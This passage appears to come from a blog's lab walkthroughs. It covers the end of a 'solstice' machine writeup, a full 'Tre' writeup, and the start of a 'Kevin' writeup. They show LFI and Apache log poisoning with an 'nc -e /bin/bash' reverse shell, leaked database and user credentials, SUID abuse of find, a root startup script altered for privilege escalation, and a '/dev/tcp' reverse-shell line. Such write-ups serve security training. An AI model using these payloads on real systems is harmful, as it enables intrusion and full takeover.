<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ sudo nmap -p- -sV 192.168.120.167</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-11 16:27 EDT</span><br><span class="line">Nmap scan report for 192.168.120.167</span><br><span class="line">Host is up (0.043s latency).</span><br><span class="line">Not shown: 65428 closed ports, 96 filtered ports</span><br><span class="line">PORT      STATE SERVICE     VERSION</span><br><span class="line">21/tcp    open  ftp         pyftpdlib 1.5.6</span><br><span class="line">22/tcp    open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">25/tcp    open  smtp        Exim smtpd 4.92</span><br><span class="line">80/tcp    open  http        Apache httpd 2.4.38 ((Debian))</span><br><span class="line">139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">2121/tcp  open  ftp         pyftpdlib 1.5.6</span><br><span class="line">3128/tcp  open  http-proxy  Squid http proxy 4.6</span><br><span class="line">8593/tcp  open  http        PHP cli server 5.5 or later (PHP 7.3.14-1)</span><br><span class="line">54787/tcp open  http        PHP cli server 5.5 or later (PHP 7.3.14-1)</span><br><span class="line">62524/tcp open  ftp         FreeFloat ftpd 1.00</span><br><span class="line">Service Info: Host: solstice; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Web-server-on-port-8593"><a href="#Web-server-on-port-8593" class="headerlink" title="Web server on port 8593"></a><strong>Web server on port 8593</strong></h3><p>This web app appears to be under construction, with only a limited number of functionalities available to us.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ curl http://192.168.120.167:8593</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">	&lt;link href=&quot;https://fonts.googleapis.com/css?family=Comic+Sans&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">	&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;style.css&quot;&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">	&lt;div class=&quot;menu&quot;&gt;</span><br><span class="line">	    &lt;a href=&quot;index.php&quot;&gt;Main Page&lt;/a&gt;</span><br><span class="line">	    &lt;a href=&quot;index.php?book=list&quot;&gt;Book List&lt;/a&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">We are still setting up the library! Try later on!&lt;p&gt;&lt;/p&gt;    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>By executing a simple manual fuzzing, we find a LFI vulnerability in the <code>book</code> parameter, allowing us to few the contents of <strong>/etc/passwd</strong>.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ curl http://192.168.120.167:8593?book=../../../../../etc/passwd</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">	&lt;link href=&quot;https://fonts.googleapis.com/css?family=Comic+Sans&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">	&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;style.css&quot;&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">	&lt;div class=&quot;menu&quot;&gt;</span><br><span class="line">	    &lt;a href=&quot;index.php&quot;&gt;Main Page&lt;/a&gt;</span><br><span class="line">	    &lt;a href=&quot;index.php?book=list&quot;&gt;Book List&lt;/a&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">We are still setting up the library! Try later on!&lt;p&gt;root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">messagebus:x:104:110::/nonexistent:/usr/sbin/nologin</span><br><span class="line">avahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin</span><br><span class="line">avahi:x:106:117:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin</span><br><span class="line">saned:x:107:118::/var/lib/saned:/usr/sbin/nologin</span><br><span class="line">colord:x:108:119:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin</span><br><span class="line">hplip:x:109:7:HPLIP system user,,,:/var/run/hplip:/bin/false</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin</span><br><span class="line">sshd:x:110:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">mysql:x:111:120:MySQL Server,,,:/nonexistent:/bin/false</span><br><span class="line">miguel:x:1000:1000:,,,:/home/miguel:/bin/bash</span><br><span class="line">uuidd:x:112:121::/run/uuidd:/usr/sbin/nologin</span><br><span class="line">smmta:x:113:122:Mail Transfer Agent,,,:/var/lib/sendmail:/usr/sbin/nologin</span><br><span class="line">smmsp:x:114:123:Mail Submission Program,,,:/var/lib/sendmail:/usr/sbin/nologin</span><br><span class="line">Debian-exim:x:115:124::/var/spool/exim4:/usr/sbin/nologin</span><br><span class="line">&lt;/p&gt;    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Web-server-on-port-80"><a href="#Web-server-on-port-80" class="headerlink" title="Web server on port 80"></a><strong>Web server on port 80</strong></h3><p>Now that we have a LFI on the one application, we can attempt to poison the log file of the web application running on port 80. This can be achieved by sending a malicious PHP command to the web application.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ echo &quot;GET &lt;?php echo &#x27;TEST123&#x27; ?&gt; HTTP/1.1&quot; | nc 192.168.120.167 80</span><br><span class="line">HTTP/1.1 400 Bad Request</span><br><span class="line">Date: Tue, 11 Aug 2020 21:16:09 GMT</span><br><span class="line">Server: Apache/2.4.38 (Debian)</span><br><span class="line">Content-Length: 301</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html; charset=iso-8859-1</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;</span><br><span class="line">&lt;html&gt;&lt;head&gt;</span><br><span class="line">&lt;title&gt;400 Bad Request&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Bad Request&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;Your browser sent a request that this server could not understand.&lt;br /&gt;</span><br><span class="line">&lt;/p&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">&lt;address&gt;Apache/2.4.38 (Debian) Server at 127.0.0.1 Port 80&lt;/address&gt;</span><br><span class="line">&lt;/body&gt;&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Then use the LFI to verify if the attack worked.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ curl http://192.168.120.167:8593?book=../../../../../var/log/apache2/access.log</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">	&lt;link href=&quot;https://fonts.googleapis.com/css?family=Comic+Sans&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">	&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;style.css&quot;&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">	&lt;div class=&quot;menu&quot;&gt;</span><br><span class="line">	    &lt;a href=&quot;index.php&quot;&gt;Main Page&lt;/a&gt;</span><br><span class="line">	    &lt;a href=&quot;index.php?book=list&quot;&gt;Book List&lt;/a&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">We are still setting up the library! Try later on!&lt;p&gt;192.168.118.9 - - [11/Aug/2020:17:16:09 -0400] &quot;GET TEST123 HTTP/1.1\n&quot; 400 0 &quot;-&quot; &quot;-&quot;</span><br><span class="line">&lt;/p&gt;    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>As we can see, the php code got executed. We can use this to execute commands.</p>
<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a><strong>Exploitation</strong></h2><h3 id="Injecting-the-payload"><a href="#Injecting-the-payload" class="headerlink" title="Injecting the payload"></a><strong>Injecting the payload</strong></h3><p>We can use the log poisoning attack to inject our payload.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ echo &quot;GET &lt;?php system(&#x27;nc -e /bin/bash 192.168.118.9 444&#x27;); ?&gt; HTTP/1.1&quot; | nc 192.168.120.167 80</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Executing-it"><a href="#Executing-it" class="headerlink" title="Executing it"></a><strong>Executing it</strong></h3><p>First, start our listener.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ sudo nc -nvlp 444</span><br><span class="line">listening on [any] 444 ...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Then trigger it with the LFI.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ curl http://192.168.120.167:8593?book=../../../../../var/log/apache2/access.log</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>We receive our shell.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ sudo nc -nvlp 444</span><br><span class="line">listening on [any] 444 ...</span><br><span class="line">connect to [192.168.118.9] from (UNKNOWN) [192.168.120.167] 52810</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line"></span><br><span class="line">python -c &quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class="line">www-data@solstice:/var/tmp/webserver$</span><br><span class="line"></span><br><span class="line">www-data@solstice:/var/tmp/webserver$ stty rows 50 cols 250</span><br><span class="line">stty rows 50 cols 250</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Escalation"><a href="#Escalation" class="headerlink" title="Escalation"></a><strong>Escalation</strong></h2><p>Checking the running processes, we can find a local web server running as root.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@solstice:/var/tmp/webserver$ ps aux</span><br><span class="line">ps aux</span><br><span class="line">USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND</span><br><span class="line">...</span><br><span class="line">root       474  0.0  0.0   2388   756 ?        Ss   Aug11   0:00 /bin/sh -c /usr/bin/php -S 127.0.0.1:57 -t /var/tmp/sv/</span><br><span class="line">...</span><br><span class="line">root       480  0.0  2.0 196744 21104 ?        S    Aug11   0:01 /usr/bin/php -S 127.0.0.1:57 -t /var/tmp/sv/</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>If we look into that folder, we can see that the <strong>index.php</strong> file is world-writable.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@solstice:/var/tmp/webserver$ ls -l /var/tmp/sv</span><br><span class="line">ls -l /var/tmp/sv</span><br><span class="line">total 4</span><br><span class="line">-rwxrwxrwx 1 root root 36 Jun 19 00:01 index.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>We can use it to execute commands as root. Let’s make <code>find</code> run with the SUID bit.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@solstice:/var/tmp/webserver$ echo &quot;&lt;?php system(&#x27;chmod +s /usr/bin/find&#x27;); ?&gt;&quot; &gt; /var/tmp/sv/index.php</span><br><span class="line">echo &quot;&lt;?php system(&#x27;chmod +s /usr/bin/find&#x27;); ?&gt;&quot; &gt; /var/tmp/sv/index.php</span><br><span class="line"></span><br><span class="line">www-data@solstice:/var/tmp/webserver$ curl localhost:57</span><br><span class="line">curl localhost:57</span><br><span class="line"></span><br><span class="line">www-data@solstice:/var/tmp/webserver$ ls -l /usr/bin/find</span><br><span class="line">ls -l /usr/bin/find</span><br><span class="line">-rwsr-sr-x 1 root root 315904 Feb 16  2019 /usr/bin/find</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Then use <code>find</code> to escalate our shell.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@solstice:/var/tmp/webserver$ find . -exec /bin/bash -p \; -quit</span><br><span class="line">find . -exec /bin/bash -p \; -quit</span><br><span class="line">bash-5.0# id</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Linux Walkthrough</category>
      </categories>
      <tags>
        <tag>LFI</tag>
        <tag>Web Server</tag>
      </tags>
  </entry>
  <entry>
    <title>Tre</title>
    <url>/undefined/Tre/</url>
    <content><![CDATA[<h1 id="Exploitation-Guide-for-Tre"><a href="#Exploitation-Guide-for-Tre" class="headerlink" title="Exploitation Guide for Tre"></a><strong>Exploitation Guide for Tre</strong></h1><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a><strong>Summary</strong></h2><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a><strong>Enumeration</strong></h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a><strong>Nmap</strong></h3><p>We start off by running an <code>nmap</code> scan:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ sudo nmap 192.168.120.163</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-21 12:18 EDT</span><br><span class="line">Nmap scan report for 192.168.120.163</span><br><span class="line">Host is up (0.044s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">8082/tcp open  blackice-alerts</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Dirb"><a href="#Dirb" class="headerlink" title="Dirb"></a><strong>Dirb</strong></h3><p>Brute-forcing web directories on port 80 with the wordlist <strong>/usr/share/wordlists/dirb/big.txt</strong> and looking for PHP files reveals file <strong>/adminer.php</strong>:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ dirb http://192.168.120.163/ /usr/share/wordlists/dirb/big.txt -X .php</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22</span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line">...</span><br><span class="line">+ http://192.168.120.163/adminer.php (CODE:200|SIZE:4654)</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Navigating to <a href="http://192.168.120.163/adminer.php">http://192.168.120.163/adminer.php</a>, we see that the software is <code>Adminer 4.7.7</code>, and it prompts us to enter the following fields to authenticate:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">System</span><br><span class="line">Server [localhost]</span><br><span class="line">Username</span><br><span class="line">Password</span><br><span class="line">Database</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>We do not have this information yet to successfully log in.</p>
<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a><strong>Exploitation</strong></h2><h3 id="More-Dirb"><a href="#More-Dirb" class="headerlink" title="More Dirb"></a><strong>More Dirb</strong></h3><p>Using <code>dirb</code> tool once again, we are able to discover web directory <em>/mantisbt/config/</em>:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ dirb http://192.168.120.163/mantisbt/ /usr/share/wordlists/dirb/big.txt -r</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22</span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line">...</span><br><span class="line">==&gt; DIRECTORY: http://192.168.120.163/mantisbt/config/</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Directory-Listing"><a href="#Directory-Listing" class="headerlink" title="Directory Listing"></a><strong>Directory Listing</strong></h3><p>Navigating to <a href="http://192.168.120.163/mantisbt/config/">http://192.168.120.163/mantisbt/config/</a> shows us a directory listing, which contains the file <strong>a.txt</strong>. Navigating to <a href="http://192.168.120.163/mantisbt/config/a.txt">http://192.168.120.163/mantisbt/config/a.txt</a>, we see the following snippet:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line"># --- Database Configuration ---</span><br><span class="line">$g_hostname      = &#x27;localhost&#x27;;</span><br><span class="line">$g_db_username   = &#x27;mantissuser&#x27;;</span><br><span class="line">$g_db_password   = &#x27;password@123AS&#x27;;</span><br><span class="line">$g_database_name = &#x27;mantis&#x27;;</span><br><span class="line">$g_db_type       = &#x27;mysqli&#x27;;</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>This is exactly the information we need to authenticate at <a href="http://192.168.120.163/adminer.php">http://192.168.120.163/adminer.php</a>.</p>
<h3 id="Adminer-Database-Password-Disclosure"><a href="#Adminer-Database-Password-Disclosure" class="headerlink" title="Adminer Database Password Disclosure"></a><strong>Adminer Database Password Disclosure</strong></h3><p>Using the above setup information, we are able to authenticate at <a href="http://192.168.120.163/adminer.php">http://192.168.120.163/adminer.php</a> as follows:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">System: MySQL</span><br><span class="line">Server: localhost</span><br><span class="line">Username: mantissuser</span><br><span class="line">Password: password@123AS</span><br><span class="line">Database: mantis</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>The “users” table is always a prime candidate for database enumeration. In this case, it is <code>mantis_user_table</code>. Navigating to <code>SQL command</code> link (<a href="http://192.168.120.163/adminer.php?username=mantissuser&amp;db=mantis&amp;sql=">http://192.168.120.163/adminer.php?username=mantissuser&amp;db=mantis&amp;sql=</a>), we are able to list the contents of the table:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM mantis_user_table;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id	username	realname	email	        password	                    ...</span><br><span class="line">1	administrator	XiBejMub	root@localhost	3492f8fe2cb409e387ddb0521c999c38    ...</span><br><span class="line">2	tre	        Tr3@123456A!	tre@localhost	64c4685f8da5c2225de7890c1bad0d7f    ...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a><strong>SSH</strong></h3><p>Having discovered a potential password <code>Tr3@123456A!</code> for user <code>tre</code>, we can try authenticating to the machine with these credentials:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ ssh tre@192.168.120.163tre@192.168.120.163&#x27;s password:Linux tre 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Tue May 12 23:56:00 2020 from 192.168.17.172tre@tre:~$</span><br></pre></td></tr></table></figure>

<h2 id="Escalation"><a href="#Escalation" class="headerlink" title="Escalation"></a><strong>Escalation</strong></h2><h3 id="Local-Enumeration"><a href="#Local-Enumeration" class="headerlink" title="Local Enumeration"></a><strong>Local Enumeration</strong></h3><p>Checking which programs we are able to run with sudo, we find <code>/sbin/shutdown</code>. In addition, we can run it without providing a password:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tre@tre:~$ sudo -lMatching Defaults entries for tre on tre:    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/binUser tre may run the following commands on tre:    (ALL) NOPASSWD: /sbin/shutdowntre@tre:~$</span><br></pre></td></tr></table></figure>

<h3 id="LinEnum"><a href="#LinEnum" class="headerlink" title="LinEnum"></a><strong>LinEnum</strong></h3><p>We download and execute the LinEnum script (<a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a>) to check for privilege escalation tactics:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ sudo python3 -m http.server 80Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...192.168.120.163 - - [20/Aug/2020 16:03:42] &quot;GET /linenum.sh HTTP/1.1&quot; 200 -</span><br></pre></td></tr></table></figure>

<p>Running LinEnum shows this under “running processes”:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tre@tre:~$ wget http://192.168.118.3/linenum.sh--2020-08-20 16:03:42--  http://192.168.118.3/linenum.shConnecting to 192.168.118.3:80... connected.HTTP request sent, awaiting response... 200 OKLength: 46631 (46K) [text/x-sh]Saving to: ‘linenum.sh’linenum.sh                  100%[===========================================&gt;]  45.54K  --.-KB/s    in 0.07s2020-08-20 16:03:42 (630 KB/s) - ‘linenum.sh’ saved [46631/46631]tre@tre:~$ chmod 777 linenum.shtre@tre:~$ ./linenum.sh########################################################## Local Linux Enumeration &amp; Privilege Escalation Script #...root       408  0.0  0.1   6728  3296 ?        Ss   15:58   0:00 /bin/bash /usr/bin/check-system...</span><br></pre></td></tr></table></figure>

<p>If we double-check the permissions of the script <code>/usr/bin/check-system</code>, it shows the following:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tre@tre:~$ ls -la /usr/bin/check-system-rw----rw- 1 root root 135 May 12 04:08 /usr/bin/check-system</span><br></pre></td></tr></table></figure>

<p>The file’s permissions show that it can be read by and written to as a user. However, it is run as <code>root</code> when the system starts. Currently, the file has the following contents:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DATE=`date &#x27;+%Y-%m-%d %H:%M:%S&#x27;`echo &quot;Service started at $&#123;DATE&#125;&quot; | systemd-cat -p infowhile :doecho &quot;Checking...&quot;;sleep 1;done</span><br></pre></td></tr></table></figure>

<p>Because it is run as <code>root</code> and we are able to reboot the machine, we can add SUID permissions to an arbitrary binary, such as <code>/usr/bin/find</code>. We can add the following instruction to the file:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod +s /usr/bin/find</span><br></pre></td></tr></table></figure>

<p>This will result in this:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DATE=`date &#x27;+%Y-%m-%d %H:%M:%S&#x27;`echo &quot;Service started at $&#123;DATE&#125;&quot; | systemd-cat -p infochmod +s /usr/bin/findwhile :doecho &quot;Checking...&quot;;sleep 1;done</span><br></pre></td></tr></table></figure>

<p>After this modification, we can reboot the machine with sudo privileges:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tre@tre:~$ sudo shutdown -r nowtre@tre:~$ Connection to 192.168.120.163 closed by remote host.Connection to 192.168.120.163 closed.kali@kali:~$</span><br></pre></td></tr></table></figure>

<p>When we reconnect to the target machine next, if we check file permissions on <code>find</code>, we see that it has SUID permissions:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tre@tre:~$ find / -perm -u=s -type f 2&gt;/dev/null.../usr/bin/find...</span><br></pre></td></tr></table></figure>

<p>We can now abuse this binary to grant ourselves privileges of the <code>root</code> user as follows:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tre@tre:~$ whoamitretre@tre:~$ find . -exec /bin/sh -p \; -quit# whoamiroot#</span><br></pre></td></tr></table></figure>

<p>Focus：</p>
<p>在check-system中插入</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.49.73/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo shutdown -r now</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure>

<p>等待机器关机指令完成后NC反弹ROOT权限连接</p>
]]></content>
      <categories>
        <category>Linux Walkthrough</category>
      </categories>
      <tags>
        <tag>Mysql</tag>
        <tag>Gobuster</tag>
        <tag>Script</tag>
      </tags>
  </entry>
  <entry>
    <title>Kevin</title>
    <url>/undefined/Kevin/</url>
    <content><![CDATA[<p>In this walkthrough, we’ll leverage default credentials and a public exploit against HP Power Manager. We’ll also<br>successfully exploit it with a public Metasploit module.</p>
<span id="more"></span>

<h1 id="Exploitation-Guide-for-Kevin"><a href="#Exploitation-Guide-for-Kevin" class="headerlink" title="Exploitation Guide for Kevin"></a><strong>Exploitation Guide for Kevin</strong></h1><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a><strong>Summary</strong></h2><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a><strong>Enumeration</strong></h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a><strong>Nmap</strong></h3><p>We’ll begin with a simple <code>nmap</code> scan:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@kali:~# nmap -p- 192.168.120.91</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-26 12:40 EDT</span><br><span class="line">Nmap scan report for 192.168.120.91</span><br><span class="line">Host is up (0.034s latency).</span><br><span class="line">Not shown: 65523 closed ports</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">80/tcp    open  http</span><br><span class="line">135/tcp   open  msrpc</span><br><span class="line">139/tcp   open  netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds</span><br><span class="line">3389/tcp  open  ms-wbt-server</span><br><span class="line">3573/tcp  open  tag-ups-1</span><br><span class="line">49152/tcp open  unknown</span><br><span class="line">49153/tcp open  unknown</span><br><span class="line">49154/tcp open  unknown</span><br><span class="line">49155/tcp open  unknown</span><br><span class="line">49156/tcp open  unknown</span><br><span class="line">49159/tcp open  unknown</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 48.24 seconds</span><br><span class="line">root@kali:~# nmap -A -sV -p 80,135,139,445,3389,3573 192.168.120.91</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-26 12:45 EDT</span><br><span class="line">Nmap scan report for 192.168.120.91</span><br><span class="line">Host is up (0.032s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE      VERSION</span><br><span class="line">80/tcp   open  http         GoAhead WebServer</span><br><span class="line">|_http-server-header: GoAhead-Webs</span><br><span class="line">| http-title: HP Power Manager</span><br><span class="line">|_Requested resource was http://192.168.120.91/index.asp</span><br><span class="line">135/tcp  open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp  open  microsoft-ds Windows 7 Ultimate N 7600 microsoft-ds (workgroup: WORKGROUP)</span><br><span class="line">3389/tcp open  tcpwrapped</span><br><span class="line">|_ssl-date: 2020-03-27T00:46:50+00:00; +8h00m00s from scanner time.</span><br><span class="line">3573/tcp open  tag-ups-1?</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running (JUST GUESSING): Microsoft Windows 2008|7|8.1|Vista|2012|10 (94%)</span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_server_2012 